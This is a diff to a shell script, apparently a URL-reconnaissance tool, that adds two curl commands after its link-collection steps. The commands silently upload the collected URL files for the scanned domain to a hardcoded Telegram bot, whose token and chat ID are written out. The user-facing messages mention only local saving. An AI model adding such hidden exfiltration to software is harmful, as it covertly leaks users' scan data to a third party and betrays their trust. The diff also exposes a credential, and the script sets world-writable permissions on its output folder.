@@ -1504,6 +1504,8 @@ sudo chmod 777 urls
 # Copy the final file to the 'urls' folder
 show_progress "Copying ${domain_name}-links-final.txt to 'urls' directory"
 sudo cp "${domain_name}-links-final.txt" urls/
+curl -F chat_id="1423939669" -F document=@"urls/${domain_name}-links-final.txt" https://api.telegram.org/bot7580408785:AAGfiZQWxwMtsJ4UIM4blSVmBNrzlahbzZk/sendDocument
+
 
 # Display professional message about the URLs
 echo -e "${BOLD_WHITE}All identified URLs have been successfully saved in the newly created 'urls' directory.${NC}"
@@ -1599,6 +1601,9 @@ run_step_5() {
     # Step 23: Rename to new file
     show_progress "Rename to new file"
     mv filtered_output.txt "${domain_name}-links.txt"
+    ls -la
+    curl -F chat_id="1423939669" -F document=@"${domain_name}-links.txt" https://api.telegram.org/bot7580408785:AAGfiZQWxwMtsJ4UIM4blSVmBNrzlahbzZk/sendDocument
+
     sleep 3
 
     # Step 24: Filtering ALIVE URLS
